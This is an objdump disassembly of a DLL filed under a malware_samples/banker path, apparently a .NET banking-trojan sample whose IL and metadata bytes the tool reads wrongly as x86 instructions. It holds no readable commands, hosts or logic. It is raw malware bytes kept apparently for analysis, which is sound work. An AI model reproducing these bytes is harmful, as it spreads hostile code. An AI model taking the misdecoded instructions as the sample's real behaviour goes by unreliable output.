
malware_samples/banker/85d905363cdc71c0f3bdddea7f531e4404644cd65d0cd7a16d5df6d3ebb3174f.dll:     file format pei-i386


Disassembly of section .text:

10002000 <.text>:
10002000:	1f                   	pop    %ds
10002001:	50                   	push   %eax
10002002:	00 00                	add    %al,(%eax)
10002004:	00 00                	add    %al,(%eax)
10002006:	00 00                	add    %al,(%eax)
10002008:	48                   	dec    %eax
10002009:	00 00                	add    %al,(%eax)
1000200b:	00 02                	add    %al,(%edx)
1000200d:	00 05 00 98 24 00    	add    %al,0x249800
10002013:	00 c0                	add    %al,%al
10002015:	2a 00                	sub    (%eax),%al
10002017:	00 01                	add    %al,(%ecx)
	...
1000204d:	00 00                	add    %al,(%eax)
1000204f:	00 1b                	add    %bl,(%ebx)
10002051:	30 0a                	xor    %cl,(%edx)
10002053:	00 7a 01             	add    %bh,0x1(%edx)
10002056:	00 00                	add    %al,(%eax)
10002058:	01 00                	add    %eax,(%eax)
1000205a:	00 11                	add    %dl,(%ecx)
1000205c:	12 00                	adc    (%eax),%al
1000205e:	fe                   	(bad)
1000205f:	15 04 00 00 02       	adc    $0x2000004,%eax
10002064:	12 00                	adc    (%eax),%al
10002066:	06                   	push   %es
10002067:	28 01                	sub    %al,(%ecx)
10002069:	00 00                	add    %al,(%eax)
1000206b:	2b 7d 05             	sub    0x5(%ebp),%edi
1000206e:	00 00                	add    %al,(%eax)
10002070:	04 12                	add    $0x12,%al
10002072:	01 fe                	add    %edi,%esi
10002074:	15 03 00 00 02       	adc    $0x2000003,%eax
10002079:	28 08                	sub    %cl,(%eax)
1000207b:	00 00                	add    %al,(%eax)
1000207d:	06                   	push   %es
1000207e:	14 7e                	adc    $0x7e,%al
10002080:	11 00                	adc    %eax,(%eax)
10002082:	00 0a                	add    %cl,(%edx)
10002084:	7e 11                	jle    0x10002097
10002086:	00 00                	add    %al,(%eax)
10002088:	0a 16                	or     (%esi),%dl
1000208a:	1a 7e 11             	sbb    0x11(%esi),%bh
1000208d:	00 00                	add    %al,(%eax)
1000208f:	0a 14 12             	or     (%edx,%edx,1),%dl
10002092:	00 12                	add    %dl,(%edx)
10002094:	01 28                	add    %ebp,(%eax)
10002096:	03 00                	add    (%eax),%eax
10002098:	00 06                	add    %al,(%esi)
1000209a:	2d 01 2a 00 07       	sub    $0x7002a01,%eax
1000209f:	7b 01                	jnp    0x100020a2
100020a1:	00 00                	add    %al,(%eax)
100020a3:	04 7e                	add    $0x7e,%al
100020a5:	11 00                	adc    %eax,(%eax)
100020a7:	00 0a                	add    %cl,(%edx)
100020a9:	03 8e 69 20 00 30    	add    0x30002069(%esi),%ecx
100020af:	00 00                	add    %al,(%eax)
100020b1:	1f                   	pop    %ds
100020b2:	40                   	inc    %eax
100020b3:	28 04 00             	sub    %al,(%eax,%eax,1)
100020b6:	00 06                	add    %al,(%esi)
100020b8:	0c 08                	or     $0x8,%al
100020ba:	7e 11                	jle    0x100020cd
100020bc:	00 00                	add    %al,(%eax)
100020be:	0a 28                	or     (%eax),%ch
100020c0:	12 00                	adc    (%eax),%al
100020c2:	00 0a                	add    %cl,(%edx)
100020c4:	2c 38                	sub    $0x38,%al
100020c6:	28 13                	sub    %dl,(%ebx)
100020c8:	00 00                	add    %al,(%eax)
100020ca:	0a 28                	or     (%eax),%ch
100020cc:	13 00                	adc    (%eax),%eax
100020ce:	00 0a                	add    %cl,(%edx)
100020d0:	72 01                	jb     0x100020d3
100020d2:	00 00                	add    %al,(%eax)
100020d4:	70 28                	jo     0x100020fe
100020d6:	14 00                	adc    $0x0,%al
100020d8:	00 0a                	add    %cl,(%edx)
100020da:	6f                   	outsl  %ds:(%esi),(%dx)
100020db:	15 00 00 0a 72       	adc    $0x720a0000,%eax
100020e0:	d4 04                	aam    $0x4
100020e2:	00 70 72             	add    %dh,0x72(%eax)
100020e5:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
100020ec:	00 0a                	add    %cl,(%edx)
100020ee:	28 14 00             	sub    %dl,(%eax,%eax,1)
100020f1:	00 0a                	add    %cl,(%edx)
100020f3:	6f                   	outsl  %ds:(%esi),(%dx)
100020f4:	15 00 00 0a 73       	adc    $0x730a0000,%eax
100020f9:	17                   	pop    %ss
100020fa:	00 00                	add    %al,(%eax)
100020fc:	0a 7a 07             	or     0x7(%edx),%bh
100020ff:	7b 01                	jnp    0x10002102
10002101:	00 00                	add    %al,(%eax)
10002103:	04 08                	add    $0x8,%al
10002105:	03 03                	add    (%ebx),%eax
10002107:	8e 69 12             	mov    0x12(%ecx),%gs
1000210a:	04 28                	add    $0x28,%al
1000210c:	01 00                	add    %eax,(%eax)
1000210e:	00 06                	add    %al,(%esi)
10002110:	2d 38 28 13 00       	sub    $0x132838,%eax
10002115:	00 0a                	add    %cl,(%edx)
10002117:	28 13                	sub    %dl,(%ebx)
10002119:	00 00                	add    %al,(%eax)
1000211b:	0a 72 ec             	or     -0x14(%edx),%dh
1000211e:	04 00                	add    $0x0,%al
10002120:	70 28                	jo     0x1000214a
10002122:	14 00                	adc    $0x0,%al
10002124:	00 0a                	add    %cl,(%edx)
10002126:	6f                   	outsl  %ds:(%esi),(%dx)
10002127:	15 00 00 0a 72       	adc    $0x720a0000,%eax
1000212c:	6f                   	outsl  %ds:(%esi),(%dx)
1000212d:	0a 00                	or     (%eax),%al
1000212f:	70 72                	jo     0x100021a3
10002131:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
10002138:	00 0a                	add    %cl,(%edx)
1000213a:	28 14 00             	sub    %dl,(%eax,%eax,1)
1000213d:	00 0a                	add    %cl,(%edx)
1000213f:	6f                   	outsl  %ds:(%esi),(%dx)
10002140:	15 00 00 0a 73       	adc    $0x730a0000,%eax
10002145:	17                   	pop    %ss
10002146:	00 00                	add    %al,(%eax)
10002148:	0a 7a 07             	or     0x7(%edx),%bh
1000214b:	7b 01                	jnp    0x1000214e
1000214d:	00 00                	add    %al,(%eax)
1000214f:	04 7e                	add    $0x7e,%al
10002151:	11 00                	adc    %eax,(%eax)
10002153:	00 0a                	add    %cl,(%edx)
10002155:	16                   	push   %ss
10002156:	08 7e 11             	or     %bh,0x11(%esi)
10002159:	00 00                	add    %al,(%eax)
1000215b:	0a 16                	or     (%esi),%dl
1000215d:	12 04 28             	adc    (%eax,%ebp,1),%al
10002160:	05 00 00 06 0d       	add    $0xd060000,%eax
10002165:	09 7e 11             	or     %edi,0x11(%esi)
10002168:	00 00                	add    %al,(%eax)
1000216a:	0a 28                	or     (%eax),%ch
1000216c:	12 00                	adc    (%eax),%al
1000216e:	00 0a                	add    %cl,(%edx)
10002170:	2d 45 09 12 06       	sub    $0x6120945,%eax
10002175:	28 06                	sub    %al,(%esi)
10002177:	00 00                	add    %al,(%eax)
10002179:	06                   	push   %es
1000217a:	2c 12                	sub    $0x12,%al
1000217c:	11 06                	adc    %eax,(%esi)
1000217e:	20 03                	and    %al,(%ebx)
10002180:	01 00                	add    %eax,(%eax)
10002182:	00 33                	add    %dh,(%ebx)
10002184:	0b 1f                	or     (%edi),%ebx
10002186:	64 28 18             	sub    %bl,%fs:(%eax)
10002189:	00 00                	add    %al,(%eax)
1000218b:	0a 2b                	or     (%ebx),%ch
1000218d:	e4 de                	in     $0xde,%al
1000218f:	45                   	inc    %ebp
10002190:	07                   	pop    %es
10002191:	7b 03                	jnp    0x10002196
10002193:	00 00                	add    %al,(%eax)
10002195:	04 28                	add    $0x28,%al
10002197:	19 00                	sbb    %eax,(%eax)
10002199:	00 0a                	add    %cl,(%edx)
1000219b:	13 05 11 05 6f 1a    	adc    0x1a6f0511,%eax
100021a1:	00 00                	add    %al,(%eax)
100021a3:	0a 16                	or     (%esi),%dl
100021a5:	fe 01                	incb   (%ecx)
100021a7:	2c 07                	sub    $0x7,%al
100021a9:	11 05 6f 1b 00 00    	adc    %eax,0x1b6f
100021af:	0a 09                	or     (%ecx),%cl
100021b1:	28 02                	sub    %al,(%edx)
100021b3:	00 00                	add    %al,(%eax)
100021b5:	06                   	push   %es
100021b6:	26 de 1c 26          	ficomps %es:(%esi,%eiz,1)
100021ba:	de 19                	ficomps (%ecx)
100021bc:	07                   	pop    %es
100021bd:	7b 01                	jnp    0x100021c0
100021bf:	00 00                	add    %al,(%eax)
100021c1:	04 28                	add    $0x28,%al
100021c3:	02 00                	add    (%eax),%al
100021c5:	00 06                	add    %al,(%esi)
100021c7:	26 07                	es pop %es
100021c9:	7b 02                	jnp    0x100021cd
100021cb:	00 00                	add    %al,(%eax)
100021cd:	04 28                	add    $0x28,%al
100021cf:	02 00                	add    (%eax),%al
100021d1:	00 06                	add    %al,(%esi)
100021d3:	26 dc 2a             	fsubrl %es:(%edx)
100021d6:	00 00                	add    %al,(%eax)
100021d8:	41                   	inc    %ecx
100021d9:	34 00                	xor    $0x0,%al
100021db:	00 00                	add    %al,(%eax)
100021dd:	00 00                	add    %al,(%eax)
100021df:	00 42 00             	add    %al,0x0(%edx)
100021e2:	00 00                	add    %al,(%eax)
100021e4:	1b 01                	sbb    (%ecx),%eax
100021e6:	00 00                	add    %al,(%eax)
100021e8:	5d                   	pop    %ebp
100021e9:	01 00                	add    %eax,(%eax)
100021eb:	00 03                	add    %al,(%ebx)
100021ed:	00 00                	add    %al,(%eax)
100021ef:	00 12                	add    %dl,(%edx)
100021f1:	00 00                	add    %al,(%eax)
100021f3:	01 02                	add    %eax,(%edx)
100021f5:	00 00                	add    %al,(%eax)
100021f7:	00 42 00             	add    %al,0x0(%edx)
100021fa:	00 00                	add    %al,(%eax)
100021fc:	1e                   	push   %ds
100021fd:	01 00                	add    %eax,(%eax)
100021ff:	00 60 01             	add    %ah,0x1(%eax)
10002202:	00 00                	add    %al,(%eax)
10002204:	19 00                	sbb    %eax,(%eax)
10002206:	00 00                	add    %al,(%eax)
10002208:	00 00                	add    %al,(%eax)
1000220a:	00 00                	add    %al,(%eax)
1000220c:	13 30                	adc    (%eax),%esi
1000220e:	07                   	pop    %es
1000220f:	00 62 02             	add    %ah,0x2(%edx)
10002212:	00 00                	add    %al,(%eax)
10002214:	02 00                	add    (%eax),%al
10002216:	00 11                	add    %dl,(%ecx)
10002218:	73 09                	jae    0x10002223
1000221a:	00 00                	add    %al,(%eax)
1000221c:	06                   	push   %es
1000221d:	0a 06                	or     (%esi),%al
1000221f:	73 1c                	jae    0x1000223d
10002221:	00 00                	add    %al,(%eax)
10002223:	0a 25 28 13 00 00    	or     0x1328,%ah
10002229:	0a 28                	or     (%eax),%ch
1000222b:	13 00                	adc    (%eax),%eax
1000222d:	00 0a                	add    %cl,(%edx)
1000222f:	72 85                	jb     0x100021b6
10002231:	0a 00                	or     (%eax),%al
10002233:	70 28                	jo     0x1000225d
10002235:	14 00                	adc    $0x0,%al
10002237:	00 0a                	add    %cl,(%edx)
10002239:	6f                   	outsl  %ds:(%esi),(%dx)
1000223a:	15 00 00 0a 72       	adc    $0x720a0000,%eax
1000223f:	38 0c 00             	cmp    %cl,(%eax,%eax,1)
10002242:	70 72                	jo     0x100022b6
10002244:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
1000224b:	00 0a                	add    %cl,(%edx)
1000224d:	28 14 00             	sub    %dl,(%eax,%eax,1)
10002250:	00 0a                	add    %cl,(%edx)
10002252:	6f                   	outsl  %ds:(%esi),(%dx)
10002253:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
10002258:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
1000225d:	28 13                	sub    %dl,(%ebx)
1000225f:	00 00                	add    %al,(%eax)
10002261:	0a 28                	or     (%eax),%ch
10002263:	13 00                	adc    (%eax),%eax
10002265:	00 0a                	add    %cl,(%edx)
10002267:	72 4e                	jb     0x100022b7
10002269:	0c 00                	or     $0x0,%al
1000226b:	70 28                	jo     0x10002295
1000226d:	14 00                	adc    $0x0,%al
1000226f:	00 0a                	add    %cl,(%edx)
10002271:	6f                   	outsl  %ds:(%esi),(%dx)
10002272:	15 00 00 0a 72       	adc    $0x720a0000,%eax
10002277:	01 0e                	add    %ecx,(%esi)
10002279:	00 70 72             	add    %dh,0x72(%eax)
1000227c:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
10002283:	00 0a                	add    %cl,(%edx)
10002285:	28 14 00             	sub    %dl,(%eax,%eax,1)
10002288:	00 0a                	add    %cl,(%edx)
1000228a:	6f                   	outsl  %ds:(%esi),(%dx)
1000228b:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
10002290:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
10002295:	28 13                	sub    %dl,(%ebx)
10002297:	00 00                	add    %al,(%eax)
10002299:	0a 28                	or     (%eax),%ch
1000229b:	13 00                	adc    (%eax),%eax
1000229d:	00 0a                	add    %cl,(%edx)
1000229f:	72 17                	jb     0x100022b8
100022a1:	0e                   	push   %cs
100022a2:	00 70 28             	add    %dh,0x28(%eax)
100022a5:	14 00                	adc    $0x0,%al
100022a7:	00 0a                	add    %cl,(%edx)
100022a9:	6f                   	outsl  %ds:(%esi),(%dx)
100022aa:	15 00 00 0a 72       	adc    $0x720a0000,%eax
100022af:	d2 0e                	rorb   %cl,(%esi)
100022b1:	00 70 72             	add    %dh,0x72(%eax)
100022b4:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
100022bb:	00 0a                	add    %cl,(%edx)
100022bd:	28 14 00             	sub    %dl,(%eax,%eax,1)
100022c0:	00 0a                	add    %cl,(%edx)
100022c2:	6f                   	outsl  %ds:(%esi),(%dx)
100022c3:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
100022c8:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
100022cd:	28 13                	sub    %dl,(%ebx)
100022cf:	00 00                	add    %al,(%eax)
100022d1:	0a 28                	or     (%eax),%ch
100022d3:	13 00                	adc    (%eax),%eax
100022d5:	00 0a                	add    %cl,(%edx)
100022d7:	72 e8                	jb     0x100022c1
100022d9:	0e                   	push   %cs
100022da:	00 70 28             	add    %dh,0x28(%eax)
100022dd:	14 00                	adc    $0x0,%al
100022df:	00 0a                	add    %cl,(%edx)
100022e1:	6f                   	outsl  %ds:(%esi),(%dx)
100022e2:	15 00 00 0a 72       	adc    $0x720a0000,%eax
100022e7:	a3 0f 00 70 72       	mov    %eax,0x7270000f
100022ec:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
100022f3:	00 0a                	add    %cl,(%edx)
100022f5:	28 14 00             	sub    %dl,(%eax,%eax,1)
100022f8:	00 0a                	add    %cl,(%edx)
100022fa:	6f                   	outsl  %ds:(%esi),(%dx)
100022fb:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
10002300:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
10002305:	28 13                	sub    %dl,(%ebx)
10002307:	00 00                	add    %al,(%eax)
10002309:	0a 28                	or     (%eax),%ch
1000230b:	13 00                	adc    (%eax),%eax
1000230d:	00 0a                	add    %cl,(%edx)
1000230f:	72 b9                	jb     0x100022ca
10002311:	0f 00                	(bad)
10002313:	70 28                	jo     0x1000233d
10002315:	14 00                	adc    $0x0,%al
10002317:	00 0a                	add    %cl,(%edx)
10002319:	6f                   	outsl  %ds:(%esi),(%dx)
1000231a:	15 00 00 0a 72       	adc    $0x720a0000,%eax
1000231f:	b4 10                	mov    $0x10,%ah
10002321:	00 70 72             	add    %dh,0x72(%eax)
10002324:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
1000232b:	00 0a                	add    %cl,(%edx)
1000232d:	28 14 00             	sub    %dl,(%eax,%eax,1)
10002330:	00 0a                	add    %cl,(%edx)
10002332:	6f                   	outsl  %ds:(%esi),(%dx)
10002333:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
10002338:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
1000233d:	28 13                	sub    %dl,(%ebx)
1000233f:	00 00                	add    %al,(%eax)
10002341:	0a 28                	or     (%eax),%ch
10002343:	13 00                	adc    (%eax),%eax
10002345:	00 0a                	add    %cl,(%edx)
10002347:	72 ca                	jb     0x10002313
10002349:	10 00                	adc    %al,(%eax)
1000234b:	70 28                	jo     0x10002375
1000234d:	14 00                	adc    $0x0,%al
1000234f:	00 0a                	add    %cl,(%edx)
10002351:	6f                   	outsl  %ds:(%esi),(%dx)
10002352:	15 00 00 0a 72       	adc    $0x720a0000,%eax
10002357:	44                   	inc    %esp
10002358:	11 00                	adc    %eax,(%eax)
1000235a:	70 72                	jo     0x100023ce
1000235c:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
10002363:	00 0a                	add    %cl,(%edx)
10002365:	28 14 00             	sub    %dl,(%eax,%eax,1)
10002368:	00 0a                	add    %cl,(%edx)
1000236a:	6f                   	outsl  %ds:(%esi),(%dx)
1000236b:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
10002370:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
10002375:	28 13                	sub    %dl,(%ebx)
10002377:	00 00                	add    %al,(%eax)
10002379:	0a 28                	or     (%eax),%ch
1000237b:	13 00                	adc    (%eax),%eax
1000237d:	00 0a                	add    %cl,(%edx)
1000237f:	72 5a                	jb     0x100023db
10002381:	11 00                	adc    %eax,(%eax)
10002383:	70 28                	jo     0x100023ad
10002385:	14 00                	adc    $0x0,%al
10002387:	00 0a                	add    %cl,(%edx)
10002389:	6f                   	outsl  %ds:(%esi),(%dx)
1000238a:	15 00 00 0a 72       	adc    $0x720a0000,%eax
1000238f:	cd 12                	int    $0x12
10002391:	00 70 72             	add    %dh,0x72(%eax)
10002394:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
1000239b:	00 0a                	add    %cl,(%edx)
1000239d:	28 14 00             	sub    %dl,(%eax,%eax,1)
100023a0:	00 0a                	add    %cl,(%edx)
100023a2:	6f                   	outsl  %ds:(%esi),(%dx)
100023a3:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
100023a8:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
100023ad:	28 13                	sub    %dl,(%ebx)
100023af:	00 00                	add    %al,(%eax)
100023b1:	0a 28                	or     (%eax),%ch
100023b3:	13 00                	adc    (%eax),%eax
100023b5:	00 0a                	add    %cl,(%edx)
100023b7:	72 e3                	jb     0x1000239c
100023b9:	12 00                	adc    (%eax),%al
100023bb:	70 28                	jo     0x100023e5
100023bd:	14 00                	adc    $0x0,%al
100023bf:	00 0a                	add    %cl,(%edx)
100023c1:	6f                   	outsl  %ds:(%esi),(%dx)
100023c2:	15 00 00 0a 72       	adc    $0x720a0000,%eax
100023c7:	de 13                	ficoms (%ebx)
100023c9:	00 70 72             	add    %dh,0x72(%eax)
100023cc:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
100023d3:	00 0a                	add    %cl,(%edx)
100023d5:	28 14 00             	sub    %dl,(%eax,%eax,1)
100023d8:	00 0a                	add    %cl,(%edx)
100023da:	6f                   	outsl  %ds:(%esi),(%dx)
100023db:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
100023e0:	1d 00 00 0a 7d       	sbb    $0x7d0a0000,%eax
100023e5:	17                   	pop    %ss
100023e6:	00 00                	add    %al,(%eax)
100023e8:	04 28                	add    $0x28,%al
100023ea:	13 00                	adc    (%eax),%eax
100023ec:	00 0a                	add    %cl,(%edx)
100023ee:	28 13                	sub    %dl,(%ebx)
100023f0:	00 00                	add    %al,(%eax)
100023f2:	0a 72 f4             	or     -0xc(%edx),%dh
100023f5:	13 00                	adc    (%eax),%eax
100023f7:	70 28                	jo     0x10002421
100023f9:	14 00                	adc    $0x0,%al
100023fb:	00 0a                	add    %cl,(%edx)
100023fd:	6f                   	outsl  %ds:(%esi),(%dx)
100023fe:	15 00 00 0a 72       	adc    $0x720a0000,%eax
10002403:	77 19                	ja     0x1000241e
10002405:	00 70 72             	add    %dh,0x72(%eax)
10002408:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
1000240f:	00 0a                	add    %cl,(%edx)
10002411:	28 14 00             	sub    %dl,(%eax,%eax,1)
10002414:	00 0a                	add    %cl,(%edx)
10002416:	6f                   	outsl  %ds:(%esi),(%dx)
10002417:	15 00 00 0a 28       	adc    $0x280a0000,%eax
1000241c:	13 00                	adc    (%eax),%eax
1000241e:	00 0a                	add    %cl,(%edx)
10002420:	28 13                	sub    %dl,(%ebx)
10002422:	00 00                	add    %al,(%eax)
10002424:	0a 72 8d             	or     -0x73(%edx),%dh
10002427:	19 00                	sbb    %eax,(%eax)
10002429:	70 28                	jo     0x10002453
1000242b:	14 00                	adc    $0x0,%al
1000242d:	00 0a                	add    %cl,(%edx)
1000242f:	6f                   	outsl  %ds:(%esi),(%dx)
10002430:	15 00 00 0a 72       	adc    $0x720a0000,%eax
10002435:	48                   	dec    %eax
10002436:	1a 00                	sbb    (%eax),%al
10002438:	70 72                	jo     0x100024ac
1000243a:	ea 04 00 70 6f 16 00 	ljmp   $0x16,$0x6f700004
10002441:	00 0a                	add    %cl,(%edx)
10002443:	28 14 00             	sub    %dl,(%eax,%eax,1)
10002446:	00 0a                	add    %cl,(%edx)
10002448:	6f                   	outsl  %ds:(%esi),(%dx)
10002449:	15 00 00 0a 17       	adc    $0x170a0000,%eax
1000244e:	28 1e                	sub    %bl,(%esi)
10002450:	00 00                	add    %al,(%eax)
10002452:	0a 06                	or     (%esi),%al
10002454:	fe 06                	incb   (%esi)
10002456:	0a 00                	or     (%eax),%al
10002458:	00 06                	add    %al,(%esi)
1000245a:	73 1f                	jae    0x1000247b
1000245c:	00 00                	add    %al,(%eax)
1000245e:	0a 28                	or     (%eax),%ch
10002460:	02 00                	add    (%eax),%al
10002462:	00 2b                	add    %ch,(%ebx)
10002464:	28 03                	sub    %al,(%ebx)
10002466:	00 00                	add    %al,(%eax)
10002468:	2b 0b                	sub    (%ebx),%ecx
1000246a:	07                   	pop    %es
1000246b:	73 22                	jae    0x1000248f
1000246d:	00 00                	add    %al,(%eax)
1000246f:	0a 07                	or     (%edi),%al
10002471:	8e 69 6f             	mov    0x6f(%ecx),%gs
10002474:	23 00                	and    (%eax),%eax
10002476:	00 0a                	add    %cl,(%edx)
10002478:	9a 2a 1e 02 28 24 00 	lcall  $0x24,$0x28021e2a
1000247f:	00 0a                	add    %cl,(%edx)
10002481:	2a 4a 02             	sub    0x2(%edx),%cl
10002484:	7b 17                	jnp    0x1000249d
10002486:	00 00                	add    %al,(%eax)
10002488:	04 03                	add    $0x3,%al
1000248a:	28 25 00 00 0a 6f    	sub    %ah,0x6f0a0000
10002490:	26 00 00             	add    %al,%es:(%eax)
10002493:	0a 2a                	or     (%edx),%ch
10002495:	00 00                	add    %al,(%eax)
10002497:	00 42 53             	add    %al,0x53(%edx)
1000249a:	4a                   	dec    %edx
1000249b:	42                   	inc    %edx
1000249c:	01 00                	add    %eax,(%eax)
1000249e:	01 00                	add    %eax,(%eax)
100024a0:	00 00                	add    %al,(%eax)
100024a2:	00 00                	add    %al,(%eax)
100024a4:	0c 00                	or     $0x0,%al
100024a6:	00 00                	add    %al,(%eax)
100024a8:	76 34                	jbe    0x100024de
100024aa:	2e 30 2e             	xor    %ch,%cs:(%esi)
100024ad:	33 30                	xor    (%eax),%esi
100024af:	33 31                	xor    (%ecx),%esi
100024b1:	39 00                	cmp    %eax,(%eax)
100024b3:	00 00                	add    %al,(%eax)
100024b5:	00 05 00 6c 00 00    	add    %al,0x6c00
100024bb:	00 3c 05 00 00 23 7e 	add    %bh,0x7e230000(,%eax,1)
100024c2:	00 00                	add    %al,(%eax)
100024c4:	a8 05                	test   $0x5,%al
100024c6:	00 00                	add    %al,(%eax)
100024c8:	8c 08                	mov    %cs,(%eax)
100024ca:	00 00                	add    %al,(%eax)
100024cc:	23 53 74             	and    0x74(%ebx),%edx
100024cf:	72 69                	jb     0x1000253a
100024d1:	6e                   	outsb  %ds:(%esi),(%dx)
100024d2:	67 73 00             	addr16 jae 0x100024d5
100024d5:	00 00                	add    %al,(%eax)
100024d7:	00 34 0e             	add    %dh,(%esi,%ecx,1)
100024da:	00 00                	add    %al,(%eax)
100024dc:	60                   	pusha
100024dd:	1a 00                	sbb    (%eax),%al
100024df:	00 23                	add    %ah,(%ebx)
100024e1:	55                   	push   %ebp
100024e2:	53                   	push   %ebx
100024e3:	00 94 28 00 00 10 00 	add    %dl,0x100000(%eax,%ebp,1)
100024ea:	00 00                	add    %al,(%eax)
100024ec:	23 47 55             	and    0x55(%edi),%eax
100024ef:	49                   	dec    %ecx
100024f0:	44                   	inc    %esp
100024f1:	00 00                	add    %al,(%eax)
100024f3:	00 a4 28 00 00 1c 02 	add    %ah,0x21c0000(%eax,%ebp,1)
100024fa:	00 00                	add    %al,(%eax)
100024fc:	23 42 6c             	and    0x6c(%edx),%eax
100024ff:	6f                   	outsl  %ds:(%esi),(%dx)
10002500:	62 00                	bound  %eax,(%eax)
10002502:	00 00                	add    %al,(%eax)
10002504:	00 00                	add    %al,(%eax)
10002506:	00 00                	add    %al,(%eax)
10002508:	02 00                	add    (%eax),%al
1000250a:	00 01                	add    %al,(%ecx)
1000250c:	57                   	push   %edi
1000250d:	15 02 1c 09 0a       	adc    $0xa091c02,%eax
10002512:	00 00                	add    %al,(%eax)
10002514:	00 fa                	add    %bh,%dl
10002516:	01 33                	add    %esi,(%ebx)
10002518:	00 16                	add    %dl,(%esi)
1000251a:	00 00                	add    %al,(%eax)
1000251c:	01 00                	add    %eax,(%eax)
1000251e:	00 00                	add    %al,(%eax)
10002520:	22 00                	and    (%eax),%al
10002522:	00 00                	add    %al,(%eax)
10002524:	05 00 00 00 17       	add    $0x17000000,%eax
10002529:	00 00                	add    %al,(%eax)
1000252b:	00 0a                	add    %cl,(%edx)
1000252d:	00 00                	add    %al,(%eax)
1000252f:	00 21                	add    %ah,(%ecx)
10002531:	00 00                	add    %al,(%eax)
10002533:	00 26                	add    %ah,(%esi)
10002535:	00 00                	add    %al,(%eax)
10002537:	00 10                	add    %dl,(%eax)
10002539:	00 00                	add    %al,(%eax)
1000253b:	00 02                	add    %al,(%edx)
1000253d:	00 00                	add    %al,(%eax)
1000253f:	00 01                	add    %al,(%ecx)
10002541:	00 00                	add    %al,(%eax)
10002543:	00 02                	add    %al,(%edx)
10002545:	00 00                	add    %al,(%eax)
10002547:	00 06                	add    %al,(%esi)
10002549:	00 00                	add    %al,(%eax)
1000254b:	00 01                	add    %al,(%ecx)
1000254d:	00 00                	add    %al,(%eax)
1000254f:	00 03                	add    %al,(%ebx)
10002551:	00 00                	add    %al,(%eax)
10002553:	00 03                	add    %al,(%ebx)
10002555:	00 00                	add    %al,(%eax)
10002557:	00 03                	add    %al,(%ebx)
10002559:	00 00                	add    %al,(%eax)
1000255b:	00 00                	add    %al,(%eax)
1000255d:	00 3e                	add    %bh,(%esi)
1000255f:	06                   	push   %es
10002560:	01 00                	add    %eax,(%eax)
10002562:	00 00                	add    %al,(%eax)
10002564:	00 00                	add    %al,(%eax)
10002566:	06                   	push   %es
10002567:	00 a1 04 4c 07 06    	add    %ah,0x6074c04(%ecx)
1000256d:	00 0e                	add    %cl,(%esi)
1000256f:	05 4c 07 06 00       	add    $0x6074c,%eax
10002574:	d5 03                	aad    $0x3
10002576:	1a 07                	sbb    (%edi),%al
10002578:	0f 00 6c 07 00       	verw   0x0(%edi,%eax,1)
1000257d:	00 06                	add    %al,(%esi)
1000257f:	00 fd                	add    %bh,%ch
10002581:	03 94 06 06 00 84 04 	add    0x4840006(%esi,%eax,1),%edx
10002588:	94                   	xchg   %eax,%esp
10002589:	06                   	push   %es
1000258a:	06                   	push   %es
1000258b:	00 65 04             	add    %ah,0x4(%ebp)
1000258e:	94                   	xchg   %eax,%esp
1000258f:	06                   	push   %es
10002590:	06                   	push   %es
10002591:	00 f5                	add    %dh,%ch
10002593:	04 94                	add    $0x94,%al
10002595:	06                   	push   %es
10002596:	06                   	push   %es
10002597:	00 c1                	add    %al,%cl
10002599:	04 94                	add    $0x94,%al
1000259b:	06                   	push   %es
1000259c:	06                   	push   %es
1000259d:	00 da                	add    %bl,%dl
1000259f:	04 94                	add    $0x94,%al
100025a1:	06                   	push   %es
100025a2:	06                   	push   %es
100025a3:	00 14 04             	add    %dl,(%esp,%eax,1)
100025a6:	94                   	xchg   %eax,%esp
100025a7:	06                   	push   %es
100025a8:	06                   	push   %es
100025a9:	00 e9                	add    %ch,%cl
100025ab:	03 2d 07 06 00 c7    	add    0xc7000607,%ebp
100025b1:	03 2d 07 06 00 48    	add    0x48000607,%ebp
100025b7:	04 94                	add    $0x94,%al
100025b9:	06                   	push   %es
100025ba:	06                   	push   %es
100025bb:	00 2f                	add    %ch,(%edi)
100025bd:	04 72                	add    $0x72,%al
100025bf:	05 06 00 9b 07       	add    $0x79b0006,%eax
100025c4:	56                   	push   %esi
100025c5:	06                   	push   %es
100025c6:	0a 00                	or     (%eax),%al
100025c8:	93                   	xchg   %eax,%ebx
100025c9:	07                   	pop    %es
100025ca:	1a 07                	sbb    (%edi),%al
100025cc:	06                   	push   %es
100025cd:	00 b3 06 56 06 06    	add    %dh,0x6065606(%ebx)
100025d3:	00 ac 03 4c 07 06 00 	add    %ch,0x6074c(%ebx,%eax,1)
100025da:	90                   	nop
100025db:	03 56 06             	add    0x6(%esi),%edx
100025de:	06                   	push   %es
100025df:	00 7a 00             	add    %bh,0x0(%edx)
100025e2:	e4 02                	in     $0x2,%al
100025e4:	06                   	push   %es
100025e5:	00 29                	add    %ch,(%ecx)
100025e7:	06                   	push   %es
100025e8:	2d 07 06 00 13       	sub    $0x13000607,%eax
100025ed:	07                   	pop    %es
100025ee:	56                   	push   %esi
100025ef:	06                   	push   %es
100025f0:	06                   	push   %es
